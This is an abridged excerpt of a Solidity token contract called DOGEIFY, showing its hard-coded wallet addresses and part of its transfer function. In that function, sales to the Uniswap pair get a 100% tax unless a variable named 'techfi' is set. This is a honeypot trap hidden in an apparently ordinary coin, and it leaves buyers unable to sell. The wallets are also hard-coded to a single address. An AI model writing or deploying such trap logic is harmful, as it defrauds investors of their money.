...
contract DOGEIFY is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0x3dE2FCe541a4C1DAEda2fE405A18f65cebE04a5a);
    address payable private _marketingAddress = payable(0x3dE2FCe541a4C1DAEda2fE405A18f65cebE04a5a);
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router) ) {
                ...
                _taxFee = techfi >= 1 ? _taxFeeOnSell : 100;
            }
        }
